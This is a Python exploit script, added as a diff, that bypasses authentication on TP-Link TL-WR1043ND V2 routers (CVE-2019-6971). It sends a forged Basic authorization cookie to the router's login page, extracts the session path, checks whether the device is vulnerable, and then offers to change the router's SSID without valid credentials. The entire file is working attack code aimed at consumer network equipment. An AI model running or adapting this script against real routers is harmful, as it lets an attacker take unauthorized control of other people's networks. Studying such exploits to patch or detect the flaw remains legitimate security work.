@@ -1,0 +1,72 @@
+# Exploit Title: TP-Link TL-WR1043ND 2 - Authentication Bypass
+# Date: 2019-06-20
+# Exploit Author: Uriel Kosayev
+# Vendor Homepage: https://www.tp-link.com
+# Version: TL-WR1043ND V2
+# Tested on: TL-WR1043ND V2
+# CVE : CVE-2019-6971
+# CVE Link: https://nvd.nist.gov/vuln/detail/CVE-2019-6971
+
+import requests
+
+ascii = '''
+  __________        __    _       __  
+ /_  __/ __ \      / /   (_)___  / /__
+  / / / /_/ /_____/ /   / / __ \/ //_/
+ / / / ____/_____/ /___/ / / / / ,<   
+/_/ /_/         /_____/_/_/ /_/_/|_|  
+
+'''
+print(ascii)
+Default_Gateway = raw_input("Enter your TP-Link router IP: ")
+
+# Constants
+url = 'http://'
+url2 = '/userRpm/LoginRpm.htm?Save=Save'
+full = url + Default_Gateway + url2
+# full = str(full)
+
+# The full GET request with the cookie authorization hijacked
+req_header = {
+    'Host': '{}'.format(Default_Gateway),
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Accept-Encoding': 'gzip, deflate',
+    'Referer': 'http://{}/userRpm/LoginRpm.htm?Save=Save'.format(Default_Gateway),
+    'Connection': 'close',
+    'Cookie': '''Authorization=Basic%20QWRtaW5pc3RyYXRvcjpjM2JiNTI5NjdiNjVjYWY4ZWRkMWNiYjg4ZDcwYzYxMQ%3D%3D''',
+    'Upgrade-Insecure-Requests': '1'
+}
+
+try:
+    response = requests.get(full, headers=req_header).content
+except requests.exceptions.ConnectionError:
+    print("Enter a valid Default Gateway IP address\nExiting...")
+    exit()
+generate = response.split('/')[3] # Gets the randomized URL "session ID"
+
+
+option_1 = input("Press 1 to check if your TP-Link router is vulnerable: ")
+
+if option_1 is 1:
+
+    if generate in response:
+        print('Vulnerable!\n')
+        option_2 = input('Press 2 if you want to change the router\'s SSID or any other key to quit: ')
+        if option_2 is 2:
+            newssid = raw_input('New name: ')
+            ssid_url = '/userRpm/WlanNetworkRpm.htm?ssid1={}&ssid2=TP-LINK_660A_2&ssid3=TP-LINK_660A_3&ssid4=TP-LINK_660A_4&region=43&band=0&mode=5&chanWidth=2&channel=1&rate=83&speedboost=2&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save'.format(
+                newssid)
+            changessid_full = url + Default_Gateway + '/' + generate + ssid_url
+            requests.get(changessid_full, headers=req_header)
+            print('Changed to: {}'.format(newssid))
+        else:
+            ("Please choose the correct option.\nExiting...")
+            exit()
+    else:
+        print('Not Vulnerable')
+        exit()
+else:
+    print("Please choose the correct option.\nExiting...")
+    exit()
